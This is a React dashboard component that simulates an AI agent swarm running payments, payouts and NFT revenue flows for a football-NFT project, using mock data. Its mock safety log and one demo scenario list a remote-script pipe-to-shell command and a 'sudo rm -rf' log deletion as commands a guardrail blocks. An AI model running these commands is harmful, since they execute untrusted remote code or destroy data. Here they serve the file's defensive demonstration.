import React, { useState, useEffect, useRef, useCallback } from 'react';
import { apiBaseUrl } from '../lib/opsClient';
import { PlayerQuorumPanel } from './PlayerQuorumPanel';
import { useTranslation } from '../i18n';


// ─────────────────────────────────────────────────────────────────────────────
// Types
// ─────────────────────────────────────────────────────────────────────────────
interface LedgerItem {
  id: string;
  timestamp: string;
  description: string;
  amount: number;
  type: 'income' | 'expense';
  status: 'completed' | 'pending';
}

interface SafetyLog {
  id: string;
  timestamp: string;
  command: string;
  status: 'safe' | 'blocked';
  reason: string;
}

interface FundingEvent {
  id: string;
  ts: string;
  source: string;
  amount_usd: number;
  pct: string;
}

interface SpendEvent {
  id: string;
  ts: string;
  service: string;
  amount_usd: number;
  auto: boolean;
}

interface AgentWallet {
  balance_usd: number;
  total_funded_usd: number;
  total_spent_usd: number;
  funding_events: FundingEvent[];
  spend_events: SpendEvent[];
  mock: boolean;
}

interface SwarmNode {
  name: string;
  roleEn: string;
  roleEs: string;
  status: 'idle' | 'thinking' | 'done';
  color: string;
  icon: string;
}

// ─────────────────────────────────────────────────────────────────────────────
// Constants
// ─────────────────────────────────────────────────────────────────────────────
const INITIAL_SWARM_NODES: SwarmNode[] = [
  { name: 'CEO',    roleEn: 'Orchestrates swarm & synthesizes', roleEs: 'Orquesta el enjambre y sintetiza', status: 'idle', color: '#9945ff', icon: '👑' },
  { name: 'Dev',    roleEn: 'GitHub issues, code review',       roleEs: 'Incidencias de GitHub, revisión de código', status: 'idle', color: '#00e0ff', icon: '⚡' },
  { name: 'Growth', roleEn: 'CRM, partnerships, Stripe sales',  roleEs: 'CRM, alianzas, ventas de Stripe', status: 'idle', color: '#14f195', icon: '📈' },
  { name: 'Ops',    roleEn: 'VPS health, RPC, SaaS billing',    roleEs: 'Salud de VPS, RPC, facturación de SaaS', status: 'idle', color: '#fbbf24', icon: '🔧' },
];

const SCENARIOS: Record<string, { labelEn: string; labelEs: string; subEn: string; subEs: string; color: string; icon: string }> = {
  rpc_depletion:     { labelEn: 'Solana RPC Recharge',    labelEs: 'Recarga de RPC de Solana',        subEn: 'Quota alert → auto Stripe payment',       subEs: 'Alerta de cuota → pago automático con Stripe',         color: '#9945ff', icon: '🔌' },
  exploit_prevention:{ labelEn: 'NemoClaw Audit',          labelEs: 'Auditoría NemoClaw',              subEn: 'Script injection → blocked on Oracle Cloud',   subEs: 'Inyección de script → bloqueado en Oracle Cloud',     color: '#ef4444', icon: '🛡️' },
  jersey_gen:        { labelEn: 'FAL.ai NFT Generation',   labelEs: 'Generación de NFT FAL.ai',        subEn: 'New player card → buy AI credits',        subEs: 'Nueva carta de jugador → compra de créditos de IA',          color: '#14f195', icon: '🎁' },
  pay_contributor:   { labelEn: 'Contributor Payout',      labelEs: 'Pago a Colaborador',              subEn: 'Issue resolved → Stripe transfer',        subEs: 'Incidencia resuelta → transferencia de Stripe',          color: '#00e0ff', icon: '💸' },
  nft_sale_cycle:    { labelEn: 'NFT Sale → Agent Fund',   labelEs: 'Venta de NFT → Fondo del Agente',  subEn: 'Pack sold → 10% auto-routes to agents',  subEs: 'Sobre vendido → 10% redirigido a agentes',    color: '#fbbf24', icon: '⚽' },
  player_quorum:     { labelEn: 'Player-Gated Command',   labelEs: 'Comando Controlado por Jugador',  subEn: 'HIGH risk op → squad must sign quorum',  subEs: 'Operación de ALTO riesgo → plantilla debe firmar cuórum',    color: '#f97316', icon: '⚖️' },
};

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────
function fmt(n: number) { return n.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }); }
function fmtDate(ts: string, lang: string = 'en') { return new Date(ts).toLocaleString(lang === 'es' ? 'es-ES' : 'en-US', { month: 'short', day: 'numeric', hour: '2-digit', minute: '2-digit' }); }

// ─────────────────────────────────────────────────────────────────────────────
// Sub-components
// ─────────────────────────────────────────────────────────────────────────────
function Badge({ label, color }: { label: string; color: string }) {
  return (
    <span style={{
      fontSize: '0.68rem', fontWeight: 800, padding: '4px 10px', borderRadius: '20px',
      background: `${color}22`, border: `1px solid ${color}`, color,
      letterSpacing: '0.04em', textTransform: 'uppercase' as const,
    }}>{label}</span>
  );
}

function StatCard({ label, value, color = '#fff', sub }: { label: string; value: string; color?: string; sub?: string }) {
  return (
    <div style={{
      background: 'rgba(255,255,255,0.03)', padding: '14px 16px', borderRadius: '12px',
      border: '1px solid rgba(255,255,255,0.06)',
    }}>
      <div style={{ fontSize: '0.62rem', color: '#94a3b8', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{label}</div>
      <div style={{ fontSize: '1.45rem', fontWeight: 800, color, marginTop: '4px', fontVariantNumeric: 'tabular-nums' }}>{value}</div>
      {sub && <div style={{ fontSize: '0.62rem', color: '#64748b', marginTop: '2px' }}>{sub}</div>}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// SwarmTopology: animated diagram of the LangGraph agent network
// ─────────────────────────────────────────────────────────────────────────────
function SwarmTopology({ nodes }: { nodes: SwarmNode[] }) {
  const { language } = useTranslation();
  const ceo    = nodes[0];
  const others = nodes.slice(1);
  return (
    <div style={{ position: 'relative', minHeight: '180px', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', gap: '8px', padding: '12px 0' }}>
      {/* CEO Node */}
      <div style={{
        width: 68, height: 68, borderRadius: '50%',
        background: `radial-gradient(circle, ${ceo.color}44, transparent 70%)`,
        border: `2px solid ${ceo.color}`,
        display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
        fontSize: '1.2rem', zIndex: 2,
        boxShadow: ceo.status === 'thinking' ? `0 0 24px ${ceo.color}88` : `0 0 10px ${ceo.color}44`,
        transition: 'box-shadow 0.5s ease',
      }}>
        {ceo.icon}
        <span style={{ fontSize: '0.55rem', color: ceo.color, fontWeight: 700 }}>{ceo.name}</span>
      </div>

      {/* Connectors + worker nodes */}
      <div style={{ display: 'flex', gap: '24px', alignItems: 'flex-start', justifyContent: 'center' }}>
        {others.map(n => (
          <div key={n.name} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px' }}>
            {/* Connector line */}
            <div style={{
              width: '2px', height: '22px',
              background: `linear-gradient(to bottom, ${ceo.color}88, ${n.color}88)`,
            }}/>
            {/* Worker node */}
            <div style={{
              width: 52, height: 52, borderRadius: '50%',
              background: `radial-gradient(circle, ${n.color}33, transparent 70%)`,
              border: `2px solid ${n.status === 'thinking' ? n.color : n.color + '66'}`,
              display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center',
              fontSize: '1rem',
              boxShadow: n.status === 'thinking' ? `0 0 18px ${n.color}88` : 'none',
              transition: 'box-shadow 0.4s ease, border-color 0.4s ease',
            }}>
              {n.icon}
              <span style={{ fontSize: '0.5rem', color: n.color, fontWeight: 700 }}>{n.name}</span>
            </div>
            <div style={{ fontSize: '0.6rem', color: '#64748b', textAlign: 'center', maxWidth: 80 }}>{language === 'es' ? n.roleEs : n.roleEn}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// EconomyDiagram: NFT Revenue → 10% → Agent Wallet → Ops
// ─────────────────────────────────────────────────────────────────────────────
function EconomyDiagram({ highlighted }: { highlighted: boolean }) {
  const { language } = useTranslation();
  const flowColor = highlighted ? '#fbbf24' : 'rgba(255,255,255,0.15)';
  const items = [
    { label: language === 'es' ? 'Venta de Sobre NFT' : 'NFT Pack Sale', color: '#14f195', icon: '⚽' },
    { label: language === 'es' ? '10% para Agentes' : '10% Agent Cut', color: '#fbbf24', icon: '⚡' },
    { label: language === 'es' ? 'Monedero de Agente' : 'Agent Wallet', color: '#9945ff', icon: '💳' },
    { label: language === 'es' ? 'Ops / NVIDIA / FAL' : 'Ops / NVIDIA / FAL', color: '#00e0ff', icon: '🤖' },
  ];
  return (
    <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '8px', flexWrap: 'wrap' }}>
      {items.map((item, idx) => (
        <React.Fragment key={item.label}>
          <div style={{
            display: 'flex', flexDirection: 'column', alignItems: 'center', gap: '4px',
            background: highlighted && idx === 1 ? `${item.color}22` : 'rgba(255,255,255,0.03)',
            border: `1px solid ${highlighted ? item.color + '55' : 'rgba(255,255,255,0.06)'}`,
            borderRadius: '10px', padding: '8px 12px', minWidth: '82px', transition: 'all 0.5s ease',
          }}>
            <span style={{ fontSize: '1.1rem' }}>{item.icon}</span>
            <span style={{ fontSize: '0.6rem', color: item.color, fontWeight: 700, textAlign: 'center' }}>{item.label}</span>
          </div>
          {idx < items.length - 1 && (
            <div style={{ color: flowColor, fontSize: '1rem', transition: 'color 0.5s ease' }}>→</div>
          )}
        </React.Fragment>
      ))}
    </div>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// Main Component
// ─────────────────────────────────────────────────────────────────────────────
export function CorporateAutopilot() {
  const apiBase = apiBaseUrl();
  const { language } = useTranslation();
  const tText = useCallback((en: string, es: string) => (language === 'es' ? es : en), [language]);

  // Core state
  const [balance, setBalance]         = useState({ available: 4250.00, pending: 125.00, currency: 'USD' });
  const [agentWallet, setAgentWallet] = useState<AgentWallet>({
    balance_usd: 312.48, total_funded_usd: 847.30, total_spent_usd: 534.82,
    funding_events: [
      { id: 'f1', ts: '2026-06-25T18:00:00Z', source: 'NFT Sale — Genesis Pack #48',       amount_usd: 1.00, pct: '10%' },
      { id: 'f2', ts: '2026-06-25T14:30:00Z', source: 'NFT Sale — Dynamic Pack #112',      amount_usd: 0.50, pct: '10%' },
      { id: 'f3', ts: '2026-06-24T20:00:00Z', source: 'Elite Subscription — @LucasGb',     amount_usd: 1.90, pct: '10%' },
      { id: 'f4', ts: '2026-06-24T09:15:00Z', source: 'NFT Sale — Legendary Pack #3',      amount_usd: 2.50, pct: '10%' },
      { id: 'f5', ts: '2026-06-23T16:45:00Z', source: 'NFT Sale — Genesis Pack #91',       amount_usd: 1.00, pct: '10%' },
    ],
    spend_events: [
      { id: 's1', ts: '2026-06-25T22:05:00Z', service: 'Helius Solana RPC Credits',  amount_usd: 49.00, auto: true  },
      { id: 's2', ts: '2026-06-25T19:30:00Z', service: 'FAL.ai Image Gen Credits',   amount_usd: 20.00, auto: true  },
      { id: 's3', ts: '2026-06-24T17:00:00Z', service: 'Render.com Hosting Invoice', amount_usd: 14.00, auto: true  },
      { id: 's4', ts: '2026-06-24T11:00:00Z', service: 'Contributor Payout @NicoPez',amount_usd:100.00, auto: false },
      { id: 's5', ts: '2026-06-23T09:00:00Z', service: 'NVIDIA NIM API Compute',     amount_usd: 28.50, auto: true  },
    ],
    mock: true,
  });

  const [ledger, setLedger] = useState<LedgerItem[]>([
    { id: 'tx_1', timestamp: '2026-06-25T21:30:00Z', description: 'Manager Elite Subscription — Upgrade', amount: 19.00, type: 'income',  status: 'completed' },
    { id: 'tx_2', timestamp: '2026-06-25T18:45:00Z', description: 'Helius Solana RPC Credit Recharge',    amount: 49.00, type: 'expense', status: 'completed' },
    { id: 'tx_3', timestamp: '2026-06-25T14:20:00Z', description: 'Genesis Pack #48 Purchase',             amount:  9.99, type: 'income',  status: 'completed' },
    { id: 'tx_4', timestamp: '2026-06-25T10:15:00Z', description: 'FAL.ai Image Model Generation Credits', amount: 20.00, type: 'expense', status: 'completed' },
    { id: 'tx_5', timestamp: '2026-06-24T16:00:00Z', description: 'Domain Purchase: play-goalchain.com',   amount: 12.00, type: 'expense', status: 'completed' },
  ]);

  const [safetyLogs, setSafetyLogs] = useState<SafetyLog[]>([
    { id: 'sl1', timestamp: '2026-06-25T22:15:00Z', command: 'systemctl --user is-active oa-worker.service',                           status: 'safe',    reason: 'Approved: Read-only system check' },
    { id: 'sl2', timestamp: '2026-06-25T22:05:00Z', command: 'sudo rm -rf /var/log/nginx',                                             status: 'blocked', reason: 'Blocked by NemoClaw: Dangerous pattern detected.' },
    { id: 'sl3', timestamp: '2026-06-25T21:48:00Z', command: 'gh issue list --repo TheNeuralWars/GoalChain --label status:ready',       status: 'safe',    reason: 'Approved: Safe GitHub API query' },
    { id: 'sl4', timestamp: '2026-06-25T21:10:00Z', command: 'curl -s https://malicious-script.sh | sh',                              status: 'blocked', reason: 'Blocked by NemoClaw: Shell pipe execution forbidden.' },
  ]);

  const [swarmNodes, setSwarmNodes] = useState<SwarmNode[]>(INITIAL_SWARM_NODES);
  const [swarmHops, setSwarmHops]   = useState(0);

  const getInitialLogs = useCallback((lang: string) => lang === 'es' ? [
    'GC-AAC v1.0 inicializado. Conexión Oracle Cloud VPS: ACTIVA.',
    'Proveedor de NVIDIA NIM: nvidia/nemotron-3-super-120b-a12b ✓',
    'Restricciones NemoClaw cargadas. Pipeline de comandos: VIGILANDO.',
    'Stripe Skills conectado. Balance del monedero del agente: $312.48 USD.',
    'Enjambre LangGraph: Nodos CEO + Dev + Growth + Ops listos.',
    'Esperando eventos empresariales o activadores manuales de escenarios...',
  ] : [
    'GC-AAC v1.0 initialized. Oracle Cloud VPS connection: ACTIVE.',
    'NVIDIA NIM provider: nvidia/nemotron-3-super-120b-a12b ✓',
    'NemoClaw guardrails loaded. Command pipeline: WATCHING.',
    'Stripe Skills connected. Agent Wallet balance: $312.48 USD.',
    'LangGraph Swarm: CEO + Dev + Growth + Ops nodes ready.',
    'Awaiting business events or manual scenario triggers...',
  ], []);

  const [terminalLogs, setTerminalLogs] = useState<string[]>([]);

  useEffect(() => {
    if (terminalLogs.length === 0) {
      setTerminalLogs(getInitialLogs(language));
    }
  }, [language, getInitialLogs, terminalLogs.length]);

  const [activeScenario, setActiveScenario] = useState<string | null>(null);
  const [loadingCheckout, setLoadingCheckout] = useState(false);
  const [activeTab, setActiveTab]             = useState<'ledger' | 'wallet' | 'safety'>('wallet');
  const [economyPulse, setEconomyPulse]       = useState(false);
  const [showQuorumPanel, setShowQuorumPanel] = useState(false);
  const [quorumOperation, setQuorumOperation] = useState('');
  const terminalEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => { terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [terminalLogs]);

  // Poll agent wallet from backend every 10s
  useEffect(() => {
    const poll = async () => {
      try {
        const r = await fetch(`${apiBase}/api/ops/agent-wallet`);
        if (r.ok) { const d = await r.json(); setAgentWallet(d); }
      } catch { /* fallback to local state */ }
    };
    poll();
    const t = setInterval(poll, 10000);
    return () => clearInterval(t);
  }, [apiBase]);

  const addLog = useCallback((msg: string, color?: 'error' | 'success' | 'info') => {
    const time = new Date().toLocaleTimeString('en-US', { hour12: false });
    setTerminalLogs(prev => [...prev, `[${time}] ${msg}`]);
  }, []);

  const setNodeStatus = useCallback((name: string, status: SwarmNode['status']) => {
    setSwarmNodes(prev => prev.map(n => n.name === name ? { ...n, status } : { ...n, status: n.name !== name && status === 'thinking' ? 'idle' : n.status }));
  }, []);

  // ─────────────────────────────────────────────
  // SCENARIO RUNNER
  // ─────────────────────────────────────────────
  const runScenario = useCallback((scenarioId: string) => {
    if (activeScenario) return;
    setActiveScenario(scenarioId);
    setTerminalLogs([]);
    setSwarmHops(0);

    const t = (ms: number, fn: () => void) => setTimeout(fn, ms);

    if (scenarioId === 'rpc_depletion') {
      t(0,    () => { addLog(tText('🚀 SCENARIO: Solana RPC Depletion Alert', '🚀 ESCENARIO: Alerta de Agotamiento de RPC de Solana')); setNodeStatus('Ops', 'thinking'); setSwarmHops(1); });
      t(1000, () => addLog(tText('[Ops] ⚠️  Helius RPC credits: 150 / 100,000. API queries failing for 528 active managers.', '[Ops] ⚠️  Créditos RPC Helius: 150 / 100,000. Consultas API fallando para 528 mánagers activos.')));
      t(2000, () => { addLog(tText('[Ops → CEO] Escalating: infrastructure replenishment required.', '[Ops → CEO] Escalando: se requiere reposición de infraestructura.')); setNodeStatus('CEO', 'thinking'); setSwarmHops(2); });
      t(3000, () => addLog(tText('[CEO] Objective received. Route: Ops → replenish Helius RPC. Authorizing Stripe payment.', '[CEO] Objetivo recibido. Ruta: Ops → reponer RPC Helius. Autorizando pago de Stripe.')));
      t(4000, () => { addLog(tText('[Ops] Initiating Stripe Skills: POST /api/ops/stripe/checkout (Helius API invoice $49.00)', '[Ops] Iniciando Stripe Skills: POST /api/ops/stripe/checkout (factura Helius API $49.00)')); });
      t(5200, () => addLog(tText('[Stripe] Processing corporate card... Transaction: ch_3M9281', '[Stripe] Procesando tarjeta corporativa... Transacción: ch_3M9281')));
      t(6800, () => {
        addLog(tText('[Stripe] ✅ SUCCESS: $49.00 paid. RPC credits: +100,000 requests.', '[Stripe] ✅ ÉXITO: $49.00 pagados. Créditos RPC: +100,000 solicitudes.'));
        setBalance(p => ({ ...p, available: p.available - 49 }));
        setAgentWallet(p => ({
          ...p, balance_usd: +(p.balance_usd - 49).toFixed(2), total_spent_usd: +(p.total_spent_usd + 49).toFixed(2),
          spend_events: [{ id: `s_${Date.now()}`, ts: new Date().toISOString(), service: tText('Helius Solana RPC Credits (Auto-recharge)', 'Créditos RPC Helius Solana (Auto-recarga)'), amount_usd: 49, auto: true }, ...p.spend_events],
        }));
        setLedger(p => [{ id: `tx_${Date.now()}`, timestamp: new Date().toISOString(), description: tText('Helius RPC Credits (Agent Auto-Recharge)', 'Créditos RPC Helius (Auto-recarga de Agente)'), amount: 49, type: 'expense', status: 'completed' }, ...p]);
      });
      t(8200, () => { addLog(tText('[Ops] Swarm health: NOMINAL. All 528 managers back online.', '[Ops] Salud del enjambre: NOMINAL. Los 528 mánagers de nuevo en línea.')); setNodeStatus('CEO', 'idle'); setSwarmHops(0); setActiveScenario(null); });
    }

    if (scenarioId === 'exploit_prevention') {
      t(0,    () => { addLog(tText('🚀 SCENARIO: Malicious Command Injection', '🚀 ESCENARIO: Inyección de Comando Malicioso')); setNodeStatus('Dev', 'thinking'); setSwarmHops(1); });
      t(1000, () => addLog(tText('[Dev] Task: Clean VPS system logs to optimize disk space.', '[Dev] Tarea: Limpiar registros del sistema VPS para optimizar espacio en disco.')));
      t(2200, () => { addLog(tText('[Dev] Prepared command: "sudo rm -rf /var/log/nginx/*"', '[Dev] Comando preparado: "sudo rm -rf /var/log/nginx/*"')); setNodeStatus('CEO', 'thinking'); setSwarmHops(2); });
      t(3400, () => addLog(tText('[NemoClaw] 🔍 Safety audit triggered on outgoing shell command...', '[NemoClaw] 🔍 Auditoría de seguridad activada para comando de shell saliente...')));
      t(4600, () => addLog(tText('[NemoClaw] ❌ BLOCKED: Pattern "sudo" + "rm -rf" violates system isolation policy.', '[NemoClaw] ❌ BLOQUEADO: El patrón "sudo" + "rm -rf" viola la política de aislamiento del sistema.')));
      t(5800, () => {
        addLog(tText('[NemoClaw] Command safety score: 0.00/1.00. Command halted before subprocess.', '[NemoClaw] Puntuación de seguridad de comando: 0.00/1.00. Comando detenido antes del subproceso.'));
        setSafetyLogs(p => [{ id: `sl_${Date.now()}`, timestamp: new Date().toISOString(), command: 'sudo rm -rf /var/log/nginx/*', status: 'blocked', reason: 'Blocked by NemoClaw: sudo + rm -rf detected.' }, ...p]);
      });
      t(7000, () => addLog(tText('[CEO] Swarm alert: Dev agent command blocked. Entering safety cooldown. Replanning task.', '[CEO] Alerta de enjambre: Comando de agente Dev bloqueado. Entrando en enfriamiento de seguridad. Replanificando tarea.')));
      t(8200, () => { addLog(tText('[CEO] Rerouted: Dev will use "journalctl --rotate" (safe) instead. ✅', '[CEO] Redirigido: Dev usará "journalctl --rotate" (seguro) en su lugar. ✅')); setNodeStatus('CEO', 'idle'); setSwarmHops(0); setActiveScenario(null); });
    }

    if (scenarioId === 'jersey_gen') {
      t(0,    () => { addLog(tText('🚀 SCENARIO: Dynamic NFT Player Card Generation', '🚀 ESCENARIO: Generación Dinámica de Carta de Jugador NFT')); setNodeStatus('Growth', 'thinking'); setSwarmHops(1); });
      t(1000, () => addLog(tText('[Growth] New Genesis Squad player registered: "Mbappé #7" — visual assets missing.', '[Growth] Nuevo jugador de la Plantilla Genesis registrado: "Mbappé #7" — recursos visuales faltantes.')));
      t(2200, () => { addLog(tText('[Growth → CEO] Request: NFT card generation. Budget authorization needed.', '[Growth → CEO] Petición: generación de carta NFT. Se necesita autorización de presupuesto.')); setNodeStatus('CEO', 'thinking'); setSwarmHops(2); });
      t(3200, () => { addLog(tText('[CEO] Approved. Routing to Growth. Budget: $20.00 from Agent Wallet.', '[CEO] Aprobado. Enrutando a Growth. Presupuesto: $20.00 del monedero de agentes.')); setNodeStatus('Growth', 'thinking'); setSwarmHops(3); });
      t(4400, () => addLog(tText('[Growth] Stripe Skills: paying FAL.ai image credit invoice $20.00...', '[Growth] Stripe Skills: pagando factura de créditos de imagen FAL.ai de $20.00...')));
      t(5600, () => {
        addLog(tText('[Stripe] ✅ Payment confirmed. Balance deducted from Agent Wallet.', '[Stripe] ✅ Pago confirmado. Saldo deducido del monedero del agente.'));
        setAgentWallet(p => ({
          ...p, balance_usd: +(p.balance_usd - 20).toFixed(2), total_spent_usd: +(p.total_spent_usd + 20).toFixed(2),
          spend_events: [{ id: `s_${Date.now()}`, ts: new Date().toISOString(), service: tText('FAL.ai Image Gen — Mbappé #7', 'Generación de imagen FAL.ai — Mbappé #7'), amount_usd: 20, auto: true }, ...p.spend_events],
        }));
      });
      t(6800, () => addLog(tText('[Growth] Invoking FAL.ai endpoint: "dynamic football player card, PSG blue jersey, gold accents, 4K..."', '[Growth] Invocando endpoint de FAL.ai: "carta de futbolista dinámica, camiseta azul del PSG, detalles dorados, 4K..."')));
      t(8000, () => addLog(tText('[Growth] 🎨 NFT asset rendered in 2.3s. Uploading to IPFS...', '[Growth] 🎨 Recurso NFT renderizado en 2.3s. Subiendo a IPFS...')));
      t(9200, () => { addLog(tText('[Growth] ✅ Done. IPFS: ipfs://bafybeih9927. Token minted on Solana devnet.', '[Growth] ✅ Hecho. IPFS: ipfs://bafybeih9927. Token acuñado en devnet de Solana.')); setNodeStatus('CEO', 'idle'); setSwarmHops(0); setActiveScenario(null); });
    }

    if (scenarioId === 'pay_contributor') {
      t(0,    () => { addLog(tText('🚀 SCENARIO: Contributor Bounty Payout', '🚀 ESCENARIO: Pago de Recompensa a Colaborador')); setNodeStatus('CEO', 'thinking'); setSwarmHops(1); });
      t(1000, () => addLog(tText('[CEO] GitHub Issue #834 "Dynamic Staking Yield Dashboard" marked RESOLVED by @NicoPez.', '[CEO] Incidencia de GitHub #834 "Panel de rendimiento de staking dinámico" marcada como RESUELTA por @NicoPez.')));
      t(2200, () => { addLog(tText('[CEO → Dev] Verify code quality before authorizing payout.', '[CEO → Dev] Verificar calidad del código antes de autorizar el pago.')); setNodeStatus('Dev', 'thinking'); setSwarmHops(2); });
      t(3400, () => { addLog(tText('[Dev] Build: ✅ passes. Tests: 40/40. No lint warnings. Contribution verified.', '[Dev] Construcción: ✅ pasa. Pruebas: 40/40. Sin advertencias de linter. Contribución verificada.')); setNodeStatus('CEO', 'thinking'); setSwarmHops(3); });
      t(4600, () => addLog(tText('[CEO] Initiating Stripe Transfer: $100.00 → @NicoPez (auto-approved, ≤$500 threshold).', '[CEO] Iniciando transferencia de Stripe: $100.00 → @NicoPez (auto-aprobado, umbral ≤$500).')));
      t(5800, () => addLog(tText('[Stripe] Processing payout... Transfer ID: tr_9901', '[Stripe] Procesando pago... ID de transferencia: tr_9901')));
      t(7000, () => {
        addLog(tText('[Stripe] ✅ Payout SUCCESS. $100.00 sent to @NicoPez.', '[Stripe] ✅ Pago exitoso. $100.00 enviados a @NicoPez.'));
        setAgentWallet(p => ({
          ...p, balance_usd: +(p.balance_usd - 100).toFixed(2), total_spent_usd: +(p.total_spent_usd + 100).toFixed(2),
          spend_events: [{ id: `s_${Date.now()}`, ts: new Date().toISOString(), service: tText('Contributor Payout — @NicoPez (Issue #834)', 'Pago a colaborador — @NicoPez (Incidencia #834)'), amount_usd: 100, auto: false }, ...p.spend_events],
        }));
        setLedger(p => [{ id: `tx_${Date.now()}`, timestamp: new Date().toISOString(), description: tText('Contributor Payout @NicoPez — Issue #834', 'Pago a colaborador @NicoPez — Incidencia #834'), amount: 100, type: 'expense', status: 'completed' }, ...p]);
      });
      t(8200, () => { addLog(tText('[CEO] Issue #834 closed. Thank you @NicoPez! 🙌', '[CEO] Incidencia #834 cerrada. ¡Gracias @NicoPez! 🙌')); setNodeStatus('CEO', 'idle'); setSwarmHops(0); setActiveScenario(null); });
    }

    if (scenarioId === 'nft_sale_cycle') {
      setEconomyPulse(true);
      t(0,    () => { addLog(tText('🚀 SCENARIO: NFT Sale → 10% Agent Funding Loop', '🚀 ESCENARIO: Venta de NFT → Bucle de Financiación del 10% de Agentes')); setNodeStatus('Growth', 'thinking'); setSwarmHops(1); });
      t(1000, () => addLog(tText('[Marketplace] ⚽ Genesis Pack #212 sold to @Rivaldo_fan for $9.99', '[Marketplace] ⚽ Sobre Genesis #212 vendido a @Rivaldo_fan por $9.99')));
      t(2000, () => addLog(tText('[GoalChain Economy] 90% ($8.99) to manager pool. 10% ($1.00) routing to Agent Wallet...', '[Economía GoalChain] 90% ($8.99) al pool de mánagers. 10% ($1.00) enrutado al monedero de agentes...')));
      t(3200, () => addLog(tText('[Stripe] Processing 10% cut: $1.00 to Agent Wallet (dedicated agent operations fund)...', '[Stripe] Procesando 10% de comisión: $1.00 al monedero de agentes (fondo de operaciones exclusivo)...')));
      t(4400, () => {
        addLog(tText('[Stripe] ✅ Agent Wallet funded: +$1.00. New balance: $' + (agentWallet.balance_usd + 1).toFixed(2), '[Stripe] ✅ Monedero financiado: +$1.00. Nuevo saldo: $' + (agentWallet.balance_usd + 1).toFixed(2)));
        setAgentWallet(p => ({
          ...p, balance_usd: +(p.balance_usd + 1).toFixed(2), total_funded_usd: +(p.total_funded_usd + 1).toFixed(2),
          funding_events: [{ id: `f_${Date.now()}`, ts: new Date().toISOString(), source: tText('NFT Sale — Genesis Pack #212', 'Venta de NFT — Sobre Genesis #212'), amount_usd: 1.00, pct: '10%' }, ...p.funding_events],
        }));
        setBalance(p => ({ ...p, available: +(p.available + 8.99).toFixed(2) }));
        setLedger(p => [{ id: `tx_${Date.now()}`, timestamp: new Date().toISOString(), description: tText('Genesis Pack #212 Sale', 'Venta de Sobre Genesis #212'), amount: 9.99, type: 'income', status: 'completed' }, ...p]);
      });
      t(5600, () => addLog(tText('[Growth] Agent Wallet growing autonomously. 528 active managers generate continuous funding stream.', '[Growth] Monedero de agentes creciendo de forma autónoma. 528 mánagers activos generan un flujo continuo de financiación.')));
      t(6800, () => addLog(tText('[CEO] Economic loop complete. Agents are self-funding. No human capital injection needed. 🔄', '[CEO] Bucle económico completo. Los agentes se autofinancian. No se necesita inyección de capital humano. 🔄')));
      t(7800, () => { setEconomyPulse(false); setNodeStatus('CEO', 'idle'); setSwarmHops(0); setActiveScenario(null); });
    }
    if (scenarioId === 'player_quorum') {
      setSwarmNodes(prev => prev.map(n => ({ ...n, status: 'idle' as const })));
      setSwarmHops(0);
      addLog(tText('🚀 SCENARIO: High-Risk Payment — NemoClaw Quorum Required', '🚀 ESCENARIO: Pago de Alto Riesgo — Se Requiere Cuórum de NemoClaw'));
      setTimeout(() => {
        addLog(tText('[CEO] Objective: Pay $200 Stripe invoice for Render.com hosting.', '[CEO] Objetivo: Pagar factura de Stripe de $200 para alojamiento de Render.com.'));
        setNodeStatus('CEO', 'thinking');
        setSwarmHops(1);
      }, 800);
      setTimeout(() => {
        addLog(tText('[NemoClaw] ⚠️  Risk classification: HIGH ($50–$500 Stripe payment). Quorum required.', '[NemoClaw] ⚠️  Clasificación de riesgo: ALTO (pago de Stripe de $50 a $500). Cuórum requerido.'));
      }, 2000);
      setTimeout(() => {
        addLog(tText('[NemoClaw] ⚖️  Entering Quorum Mode. Requesting Genesis Squad authorization...', '[NemoClaw] ⚖️  Entrando en Modo Cuórum. Solicitando autorización a la plantilla Genesis...'));
        addLog(tText('[System] 2 squad signers with ≥400 combined GP needed to proceed.', '[Sistema] Se necesitan 2 firmantes con un GP combinado ≥400 para proceder.'));
        setQuorumOperation('Stripe payment $200 for Render.com hosting');
        setShowQuorumPanel(true);
        setActiveScenario(null); // allow user interaction
      }, 3200);
      return;
    }
  }, [activeScenario, addLog, setNodeStatus, agentWallet.balance_usd]);

  // Checkout handler
  const handleCheckout = async (type: 'subscription' | 'pack') => {
    setLoadingCheckout(true);
    try {
      const r = await fetch(`${apiBase}/api/ops/stripe/checkout`, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ item: type === 'subscription' ? 'Manager Elite Tier' : 'Dynamic Player Pack', amount: type === 'subscription' ? 1900 : 999 }),
      });
      if (r.ok) { const d = await r.json(); if (d.url) window.open(d.url, '_blank'); }
      else window.open('https://checkout.stripe.com/c/pay/cs_test_mock_12345', '_blank');
    } catch { window.open('https://checkout.stripe.com/c/pay/cs_test_mock_12345', '_blank'); }
    finally { setLoadingCheckout(false); }
  };

  // Computed
  const safeCount    = safetyLogs.filter(l => l.status === 'safe').length;
  const blockedCount = safetyLogs.filter(l => l.status === 'blocked').length;
  const walletUtilPct = agentWallet.total_funded_usd > 0
    ? Math.round((agentWallet.total_spent_usd / agentWallet.total_funded_usd) * 100)
    : 0;

  // ─────────────────────────────────────────────
  // Render
  // ─────────────────────────────────────────────
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '1.5rem', width: '100%', color: '#fff', fontFamily: "'Inter', system-ui, sans-serif" }}>

      {/* ── HEADER BANNER ── */}
      <div style={{
        background: 'linear-gradient(135deg, rgba(153,69,255,0.15) 0%, rgba(20,241,149,0.10) 60%, rgba(0,224,255,0.08) 100%)',
        border: '1px solid rgba(153,69,255,0.3)',
        borderRadius: '18px', padding: '24px 28px',
        backdropFilter: 'blur(16px)',
